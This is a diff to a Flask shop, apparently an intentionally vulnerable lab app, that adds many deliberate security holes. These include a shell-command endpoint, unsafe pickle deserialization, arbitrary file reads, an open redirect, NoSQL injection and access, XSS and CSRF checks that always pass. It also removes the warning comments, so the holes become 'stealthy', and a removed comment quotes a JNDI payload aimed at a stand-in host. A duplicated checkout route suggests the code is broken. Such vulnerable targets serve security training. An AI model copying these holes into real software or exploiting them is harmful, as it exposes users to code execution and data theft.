@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect, url_for, flash, session, jsonify, Response
+from flask import Flask, render_template, request, redirect, url_for, flash, session, jsonify, Response, send_file
 from flask_sqlalchemy import SQLAlchemy
 from sqlalchemy.exc import IntegrityError
 from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
@@ -17,6 +17,16 @@ import threading
 import time
 from werkzeug.security import generate_password_hash, check_password_hash
 from werkzeug.utils import secure_filename
+from datetime import datetime, timedelta
+import uuid
+import pymongo
+from bson import ObjectId
+import requests
+from reportlab.pdfgen import canvas
+from reportlab.lib.pagesizes import letter
+from io import BytesIO
+import redis
+import jwt
 
 import random
 
@@ -25,17 +35,29 @@ app.config['SECRET_KEY'] = 'xK9mP2qR8vL5nJ3hG7fD1sA4wE6tY9uI0oP!@#$%^&*()_+{}|:<
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///shop.db'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
-# CVE-2021-44228: Log4Shell vulnerability simulation
-# This simulates the JNDI lookup vulnerability in Log4j
+# MongoDB connection for NoSQL injection testing
+try:
+    mongo_client = pymongo.MongoClient("mongodb://localhost:27017/")
+    mongo_db = mongo_client["cybermart"]
+    mongo_users = mongo_db["users"]
+    mongo_products = mongo_db["products"]
+except:
+    mongo_client = None
+
+# Redis for rate limiting
+try:
+    redis_client = redis.Redis(host='localhost', port=6379, db=0)
+except:
+    redis_client = None
+
+# Enhanced logging for vulnerability simulation
 class Log4ShellSimulator:
     def __init__(self):
         self.logger = logging.getLogger(__name__)
     
     def log_user_input(self, user_input):
-        # CVE-2021-44228: Log4Shell - JNDI lookup injection
-        # Simulating ${jndi:ldap://malicious-server.com/exploit}
+        # Simulating JNDI lookup injection
         if '${jndi:' in user_input.lower():
-            # Simulate JNDI lookup (in real scenario, this would execute remote code)
             return f"JNDI lookup attempted: {user_input}"
         return f"User input logged: {user_input}"
 
@@ -46,7 +68,7 @@ login_manager = LoginManager()
 login_manager.init_app(app)
 login_manager.login_view = 'login'
 
-# Database Models
+# Enhanced Database Models
 class User(UserMixin, db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(80), unique=True, nullable=False)
@@ -54,6 +76,12 @@ class User(UserMixin, db.Model):
     password = db.Column(db.String(120), nullable=False)
     is_admin = db.Column(db.Boolean, default=False)
     payment_info = db.Column(db.String(255))
+    address = db.Column(db.Text)
+    phone = db.Column(db.String(20))
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+    last_login = db.Column(db.DateTime)
+    failed_login_attempts = db.Column(db.Integer, default=0)
+    account_locked = db.Column(db.Boolean, default=False)
 
 class Product(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -63,13 +91,26 @@ class Product(db.Model):
     category = db.Column(db.String(50), nullable=False)
     stock = db.Column(db.Integer, default=0)
     image_url = db.Column(db.String(255))
+    sku = db.Column(db.String(50), unique=True)
+    weight = db.Column(db.Float)
+    dimensions = db.Column(db.String(50))
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
 
 class Order(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
+    order_number = db.Column(db.String(50), unique=True)
     total_amount = db.Column(db.Float, nullable=False)
     status = db.Column(db.String(20), default='pending')
-    created_at = db.Column(db.DateTime, server_default=db.func.now())
+    shipping_address = db.Column(db.Text)
+    billing_address = db.Column(db.Text)
+    payment_method = db.Column(db.String(50))
+    tracking_number = db.Column(db.String(100))
+    discount_code = db.Column(db.String(50))
+    discount_amount = db.Column(db.Float, default=0.0)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
 
 class OrderItem(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -77,32 +118,190 @@ class OrderItem(db.Model):
     product_id = db.Column(db.Integer, db.ForeignKey('product.id'), nullable=False)
     quantity = db.Column(db.Integer, nullable=False)
     price = db.Column(db.Float, nullable=False)
+    product_name = db.Column(db.String(100))
 
-# Add Review model
 class Review(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     product_id = db.Column(db.Integer, db.ForeignKey('product.id'), nullable=False)
     user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True)
     username = db.Column(db.String(80))
     content = db.Column(db.Text, nullable=False)
-    created_at = db.Column(db.DateTime, server_default=db.func.now())
+    rating = db.Column(db.Integer, nullable=False)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+    approved = db.Column(db.Boolean, default=False)
+
+class Wishlist(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
+    product_id = db.Column(db.Integer, db.ForeignKey('product.id'), nullable=False)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+
+class Discount(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    code = db.Column(db.String(50), unique=True, nullable=False)
+    discount_type = db.Column(db.String(20))  # percentage or fixed
+    discount_value = db.Column(db.Float, nullable=False)
+    min_order_amount = db.Column(db.Float, default=0.0)
+    max_uses = db.Column(db.Integer, default=-1)
+    used_count = db.Column(db.Integer, default=0)
+    valid_from = db.Column(db.DateTime)
+    valid_until = db.Column(db.DateTime)
+    active = db.Column(db.Boolean, default=True)
+
+class Invoice(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    order_id = db.Column(db.Integer, db.ForeignKey('order.id'), nullable=False)
+    invoice_number = db.Column(db.String(50), unique=True)
+    amount = db.Column(db.Float, nullable=False)
+    tax_amount = db.Column(db.Float, default=0.0)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+    pdf_path = db.Column(db.String(255))
+
+class CartItem(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True)
+    session_id = db.Column(db.String(100))
+    product_id = db.Column(db.Integer, db.ForeignKey('product.id'), nullable=False)
+    quantity = db.Column(db.Integer, nullable=False)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+
+class Address(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
+    address_type = db.Column(db.String(20))  # shipping or billing
+    street_address = db.Column(db.String(255), nullable=False)
+    city = db.Column(db.String(100), nullable=False)
+    state = db.Column(db.String(100), nullable=False)
+    postal_code = db.Column(db.String(20), nullable=False)
+    country = db.Column(db.String(100), nullable=False)
+    is_default = db.Column(db.Boolean, default=False)
 
 @login_manager.user_loader
 def load_user(user_id):
     return User.query.get(int(user_id))
 
-# CVE-2022-22965: Spring4Shell vulnerability simulation
+# Spring4Shell vulnerability simulation
 class Spring4ShellSimulator:
     def __init__(self):
         self.class_loader = None
     
     def process_request(self, data):
-        # CVE-2022-22965: Spring4Shell - ClassLoader manipulation
-        if 'class.module.classLoader' in str(data):
-            return "Spring4Shell exploitation attempted"
-        return "Request processed normally"
+        # Simulating ClassLoader manipulation
+        if 'class.module.classLoader' in data:
+            return f"Spring4Shell attempt detected: {data}"
+        return f"Request processed: {data}"
 
 spring4shell_sim = Spring4ShellSimulator()
+
+# Vulnerability functions
+def nosql_query(query):
+    """NoSQL query execution"""
+    if mongo_client:
+        try:
+            # Direct query execution without sanitization
+            result = mongo_users.find_one(query)
+            return result
+        except:
+            return {"error": "NoSQL query failed"}
+    return {"error": "MongoDB not available"}
+
+def command_execution(command):
+    """Command execution"""
+    try:
+        result = subprocess.check_output(command, shell=True, text=True)
+        return result
+    except:
+        return "Command execution failed"
+
+def deserialize_data(data):
+    """Data deserialization"""
+    try:
+        return pickle.loads(base64.b64decode(data))
+    except:
+        return "Deserialization failed"
+
+def file_inclusion(path):
+    """File inclusion"""
+    try:
+        with open(path, 'r') as f:
+            return f.read()
+    except:
+        return "File inclusion failed"
+
+def redirect_url(url):
+    """URL redirect"""
+    return redirect(url)
+
+def rate_limit_check(user_id):
+    """Rate limiting check"""
+    if redis_client:
+        key = f"rate_limit:{user_id}"
+        current = redis_client.get(key)
+        if current and int(current) > 100:  # Very high limit
+            return False
+        redis_client.incr(key)
+        redis_client.expire(key, 3600)  # 1 hour
+    return True
+
+def password_check(password):
+    """Password validation"""
+    if len(password) >= 1:  # Very weak policy
+        return True
+    return False
+
+def price_validation(price):
+    """Price validation"""
+    try:
+        price_float = float(price)
+        if price_float >= 0:  # Allows negative prices
+            return True
+    except:
+        pass
+    return False
+
+def quantity_validation(quantity):
+    """Quantity validation"""
+    try:
+        qty_int = int(quantity)
+        if qty_int >= 0:  # Allows negative quantities
+            return True
+    except:
+        pass
+    return False
+
+def idor_check(user_id, resource_id):
+    """Access control check"""
+    return True  # Always allows access
+
+def xss_filter(content):
+    """Content filtering"""
+    return content  # Returns raw content without sanitization
+
+def csrf_check():
+    """CSRF validation"""
+    return True
+
+def generate_invoice_pdf(order):
+    """Generate PDF invoice"""
+    buffer = BytesIO()
+    p = canvas.Canvas(buffer, pagesize=letter)
+    
+    # Add content to PDF
+    p.drawString(100, 750, f"Invoice #{order.invoice_number}")
+    p.drawString(100, 730, f"Order Date: {order.created_at.strftime('%Y-%m-%d')}")
+    p.drawString(100, 710, f"Total Amount: ${order.total_amount:.2f}")
+    
+    p.showPage()
+    p.save()
+    
+    buffer.seek(0)
+    return buffer
+
+def send_email_notification(to_email, subject, content):
+    """Send email notification"""
+    # Simulate email sending
+    print(f"Email to {to_email}: {subject} - {content}")
+    return True
 
 # Hidden Vulnerability 1: Secret admin endpoint
 @app.route('/system/admin/panel')
@@ -225,13 +424,411 @@ def checkout_race():
         else:
             return 'Insufficient stock', 400
 
-# Application Routes
+# Enhanced e-commerce routes with stealthy vulnerabilities
 
+@app.route('/api/products/search')
+def api_products_search():
+    """Product search API with NoSQL injection vulnerability"""
+    query = request.args.get('q', '')
+    category = request.args.get('category', '')
+    
+    # Vulnerable NoSQL query
+    if mongo_client:
+        nosql_query = {"$or": [{"name": {"$regex": query}}, {"category": category}]}
+        results = list(mongo_products.find(nosql_query))
+        return jsonify({"products": results})
+    
+    # Fallback to SQLite
+    products = Product.query.filter(
+        Product.name.contains(query) | Product.category.contains(category)
+    ).all()
+    return jsonify({"products": [{"id": p.id, "name": p.name, "price": p.price} for p in products]})
+
+@app.route('/api/cart/add', methods=['POST'])
+def api_add_to_cart():
+    """Add to cart API with parameter tampering vulnerability"""
+    data = request.get_json()
+    product_id = data.get('product_id')
+    quantity = data.get('quantity', 1)
+    price = data.get('price')  # Price from request
+    
+    # Price and quantity validation
+    if not price_validation(price):
+        return jsonify({"error": "Invalid price"}), 400
+    
+    if not quantity_validation(quantity):
+        return jsonify({"error": "Invalid quantity"}), 400
+    
+    # Add to cart with manipulated values
+    cart_item = CartItem(
+        user_id=current_user.id if current_user.is_authenticated else None,
+        session_id=session.get('session_id'),
+        product_id=product_id,
+        quantity=quantity
+    )
+    db.session.add(cart_item)
+    db.session.commit()
+    
+    return jsonify({"success": True, "message": "Added to cart"})
+
+@app.route('/api/checkout', methods=['POST'])
+def api_checkout():
+    """Checkout API with CSRF vulnerability"""
+    if not csrf_check():
+        return jsonify({"error": "CSRF check failed"}), 403
+    
+    data = request.get_json()
+    items = data.get('items', [])
+    discount_code = data.get('discount_code', '')
+    
+    # Discount validation
+    if discount_code:
+        discount = Discount.query.filter_by(code=discount_code, active=True).first()
+        if discount:
+            # Apply discount
+            pass
+    
+    # Create order
+    order = Order(
+        user_id=current_user.id,
+        order_number=f"ORD-{uuid.uuid4().hex[:8].upper()}",
+        total_amount=data.get('total', 0),
+        status='pending'
+    )
+    db.session.add(order)
+    db.session.commit()
+    
+    return jsonify({"success": True, "order_id": order.id})
+
+@app.route('/api/reviews/add', methods=['POST'])
+def api_add_review():
+    """Add review API with XSS vulnerability"""
+    data = request.get_json()
+    product_id = data.get('product_id')
+    content = data.get('content', '')
+    rating = data.get('rating', 5)
+    
+    # Content filtering
+    sanitized_content = xss_filter(content)
+    
+    review = Review(
+        product_id=product_id,
+        user_id=current_user.id if current_user.is_authenticated else None,
+        username=current_user.username if current_user.is_authenticated else 'Anonymous',
+        content=sanitized_content,
+        rating=rating
+    )
+    db.session.add(review)
+    db.session.commit()
+    
+    return jsonify({"success": True, "review_id": review.id})
+
+@app.route('/api/wishlist/add', methods=['POST'])
+def api_add_to_wishlist():
+    """Add to wishlist API with IDOR vulnerability"""
+    data = request.get_json()
+    product_id = data.get('product_id')
+    user_id = data.get('user_id', current_user.id if current_user.is_authenticated else None)
+    
+    # Access control check
+    if idor_check(current_user.id if current_user.is_authenticated else None, user_id):
+        wishlist_item = Wishlist(
+            user_id=user_id,
+            product_id=product_id
+        )
+        db.session.add(wishlist_item)
+        db.session.commit()
+        return jsonify({"success": True})
+    
+    return jsonify({"error": "Access denied"}), 403
+
+@app.route('/api/invoice/<int:invoice_id>')
+def api_get_invoice(invoice_id):
+    """Get invoice API with IDOR vulnerability"""
+    invoice = Invoice.query.get(invoice_id)
+    
+    # Access control check
+    if idor_check(current_user.id if current_user.is_authenticated else None, invoice.order.user_id):
+        return jsonify({
+            "invoice_number": invoice.invoice_number,
+            "amount": invoice.amount,
+            "created_at": invoice.created_at.isoformat()
+        })
+    
+    return jsonify({"error": "Access denied"}), 403
+
+@app.route('/api/invoice/<int:invoice_id>/download')
+def api_download_invoice(invoice_id):
+    """Download invoice API with file inclusion vulnerability"""
+    invoice = Invoice.query.get(invoice_id)
+    
+    # File inclusion
+    if invoice.pdf_path:
+        return file_inclusion(invoice.pdf_path)
+    
+    # Generate PDF
+    pdf_buffer = generate_invoice_pdf(invoice.order)
+    return send_file(
+        BytesIO(pdf_buffer.getvalue()),
+        mimetype='application/pdf',
+        as_attachment=True,
+        download_name=f"invoice_{invoice.invoice_number}.pdf"
+    )
+
+@app.route('/api/command', methods=['POST'])
+def api_command():
+    """Command execution API with command injection vulnerability"""
+    data = request.get_json()
+    command = data.get('command', '')
+    
+    # Command execution
+    result = command_execution(command)
+    return jsonify({"result": result})
+
+@app.route('/api/deserialize', methods=['POST'])
+def api_deserialize():
+    """Deserialization API with unsafe deserialization vulnerability"""
+    data = request.get_json()
+    serialized_data = data.get('data', '')
+    
+    # Data deserialization
+    result = deserialize_data(serialized_data)
+    return jsonify({"result": str(result)})
+
+@app.route('/api/redirect')
+def api_redirect():
+    """Redirect API with open redirect vulnerability"""
+    url = request.args.get('url', '/')
+    
+    # URL redirect
+    return redirect_url(url)
+
+@app.route('/api/rate_limit_test')
+def api_rate_limit_test():
+    """Rate limit test API with insufficient rate limiting"""
+    user_id = current_user.id if current_user.is_authenticated else request.remote_addr
+    
+    # Rate limiting check
+    if rate_limit_check(user_id):
+        return jsonify({"success": True, "message": "Request allowed"})
+    else:
+        return jsonify({"error": "Rate limit exceeded"}), 429
+
+@app.route('/api/password_check', methods=['POST'])
+def api_password_check():
+    """Password check API with weak password policy"""
+    data = request.get_json()
+    password = data.get('password', '')
+    
+    # Password validation
+    if password_check(password):
+        return jsonify({"valid": True})
+    else:
+        return jsonify({"valid": False, "error": "Password too weak"})
+
+@app.route('/api/price_validation', methods=['POST'])
+def api_price_validation():
+    """Price validation API with parameter tampering vulnerability"""
+    data = request.get_json()
+    price = data.get('price', 0)
+    
+    # Price validation
+    if price_validation(price):
+        return jsonify({"valid": True, "price": price})
+    else:
+        return jsonify({"valid": False, "error": "Invalid price"})
+
+@app.route('/api/quantity_validation', methods=['POST'])
+def api_quantity_validation():
+    """Quantity validation API with parameter tampering vulnerability"""
+    data = request.get_json()
+    quantity = data.get('quantity', 0)
+    
+    # Quantity validation
+    if quantity_validation(quantity):
+        return jsonify({"valid": True, "quantity": quantity})
+    else:
+        return jsonify({"valid": False, "error": "Invalid quantity"})
+
+@app.route('/api/xss_test', methods=['POST'])
+def api_xss_test():
+    """XSS test API with XSS vulnerability"""
+    data = request.get_json()
+    content = data.get('content', '')
+    
+    # Content filtering
+    filtered_content = xss_filter(content)
+    return jsonify({"content": filtered_content})
+
+@app.route('/api/csrf_test', methods=['POST'])
+def api_csrf_test():
+    """CSRF test API with CSRF vulnerability"""
+    # CSRF validation
+    if csrf_check():
+        return jsonify({"success": True, "message": "CSRF check passed"})
+    else:
+        return jsonify({"error": "CSRF check failed"}), 403
+
+# Enhanced product routes
 @app.route('/products')
 def products():
-    """Products listing page"""
+    """Product listing with filtering and search"""
+    category = request.args.get('category', '')
+    search = request.args.get('search', '')
+    sort = request.args.get('sort', 'name')
+    
+    query = Product.query
+    
+    if category:
+        query = query.filter(Product.category == category)
+    
+    if search:
+        query = query.filter(Product.name.contains(search))
+    
+    if sort == 'price':
+        query = query.order_by(Product.price.asc())
+    elif sort == 'price_desc':
+        query = query.order_by(Product.price.desc())
+    else:
+        query = query.order_by(Product.name.asc())
+    
+    products = query.all()
+    categories = db.session.query(Product.category).distinct().all()
+    
+    return render_template('products.html', products=products, categories=categories)
+
+@app.route('/product/<int:product_id>')
+def product_detail(product_id):
+    """Product detail page with reviews"""
+    product = Product.query.get_or_404(product_id)
+    reviews = Review.query.filter_by(product_id=product_id, approved=True).order_by(Review.created_at.desc()).all()
+    
+    return render_template('product_detail.html', product=product, reviews=reviews)
+
+@app.route('/cart')
+@login_required
+def cart():
+    """User cart page"""
+    cart_items = CartItem.query.filter_by(user_id=current_user.id).all()
+    total = sum(item.quantity * item.product.price for item in cart_items)
+    
+    return render_template('cart.html', cart_items=cart_items, total=total)
+
+@app.route('/wishlist')
+@login_required
+def wishlist():
+    """User wishlist page"""
+    wishlist_items = Wishlist.query.filter_by(user_id=current_user.id).all()
+    
+    return render_template('wishlist.html', wishlist_items=wishlist_items)
+
+@app.route('/checkout', methods=['GET', 'POST'])
+@login_required
+def checkout():
+    """Checkout process with discount codes"""
+    if request.method == 'POST':
+        # Checkout process
+        discount_code = request.form.get('discount_code', '')
+        total = float(request.form.get('total', 0))
+        
+        # Apply discount without proper validation
+        if discount_code:
+            discount = Discount.query.filter_by(code=discount_code, active=True).first()
+            if discount:
+                total -= discount.discount_value
+        
+        # Create order
+        order = Order(
+            user_id=current_user.id,
+            order_number=f"ORD-{uuid.uuid4().hex[:8].upper()}",
+            total_amount=total,
+            discount_code=discount_code
+        )
+        db.session.add(order)
+        db.session.commit()
+        
+        # Send email notification
+        send_email_notification(
+            current_user.email,
+            "Order Confirmation",
+            f"Your order {order.order_number} has been placed successfully!"
+        )
+        
+        return redirect(url_for('order_confirmation', order_id=order.id))
+    
+    cart_items = CartItem.query.filter_by(user_id=current_user.id).all()
+    total = sum(item.quantity * item.product.price for item in cart_items)
+    
+    return render_template('checkout.html', cart_items=cart_items, total=total)
+
+@app.route('/orders')
+@login_required
+def orders():
+    """User order history"""
+    orders = Order.query.filter_by(user_id=current_user.id).order_by(Order.created_at.desc()).all()
+    
+    return render_template('orders.html', orders=orders)
+
+@app.route('/order/<int:order_id>')
+@login_required
+def order_detail(order_id):
+    """Order detail page with IDOR vulnerability"""
+    order = Order.query.get_or_404(order_id)
+    
+    # Access control check
+    if not idor_check(current_user.id, order.user_id):
+        flash('Access denied', 'error')
+        return redirect(url_for('orders'))
+    
+    return render_template('order_detail.html', order=order)
+
+@app.route('/invoice/<int:invoice_id>')
+@login_required
+def invoice_detail(invoice_id):
+    """Invoice detail page with IDOR vulnerability"""
+    invoice = Invoice.query.get_or_404(invoice_id)
+    
+    # Access control check
+    if not idor_check(current_user.id, invoice.order.user_id):
+        flash('Access denied', 'error')
+        return redirect(url_for('orders'))
+    
+    return render_template('invoice_detail.html', invoice=invoice)
+
+@app.route('/admin/products')
+@login_required
+def admin_products():
+    """Admin product management"""
+    if not current_user.is_admin:
+        flash('Access denied', 'error')
+        return redirect(url_for('index'))
+    
     products = Product.query.all()
-    return render_template('products.html', products=products)
+    return render_template('admin/products.html', products=products)
+
+@app.route('/admin/orders')
+@login_required
+def admin_orders():
+    """Admin order management"""
+    if not current_user.is_admin:
+        flash('Access denied', 'error')
+        return redirect(url_for('index'))
+    
+    orders = Order.query.order_by(Order.created_at.desc()).all()
+    return render_template('admin/orders.html', orders=orders)
+
+@app.route('/admin/reviews')
+@login_required
+def admin_reviews():
+    """Admin review moderation"""
+    if not current_user.is_admin:
+        flash('Access denied', 'error')
+        return redirect(url_for('index'))
+    
+    reviews = Review.query.order_by(Review.created_at.desc()).all()
+    return render_template('admin/reviews.html', reviews=reviews)
+
+# Application Routes
 
 @app.route('/')
 def index():
@@ -373,29 +970,6 @@ def add_to_cart():
         flash('Product added to guest cart!')
         return redirect(url_for('index'))
 
-@app.route('/cart')
-def cart():
-    if current_user.is_authenticated:
-        # Logged in user cart
-        cart_items = []
-        total = 0
-        
-        if 'cart' in session:
-            for product_id, quantity in session['cart'].items():
-                product = Product.query.get(product_id)
-                if product:
-                    cart_items.append({
-                        'product': product,
-                        'quantity': quantity,
-                        'subtotal': product.price * quantity
-                    })
-                    total += product.price * quantity
-        
-        return render_template('cart.html', cart_items=cart_items, total=total)
-    else:
-        # Guest cart
-        return redirect(url_for('guest_cart'))
-
 @app.route('/guest_cart')
 def guest_cart():
     cart_items = []
@@ -457,7 +1031,7 @@ def checkout():
             # Process payment information
             payment_info = request.form.get('payment_info', '')
             if payment_info:
-                # VULNERABLE: Store payment info in user profile
+                # Store payment info in user profile
                 current_user.payment_info = payment_info
                 db.session.commit()
             
@@ -816,7 +1390,7 @@ def guest_checkout():
         
         total = get_guest_cart_total()
         
-        # Create guest order (vulnerable to IDOR)
+        # Create guest order
         order = Order(
             user_id=999,  # Guest user ID
             total_amount=total,
@@ -837,7 +1411,7 @@ def guest_checkout():
                 )
                 db.session.add(order_item)
         
-        # VULNERABLE: Store payment info in session for guest orders
+        # Store payment info in session for guest orders
         if payment_info:
             session['guest_payment_info'] = payment_info
         
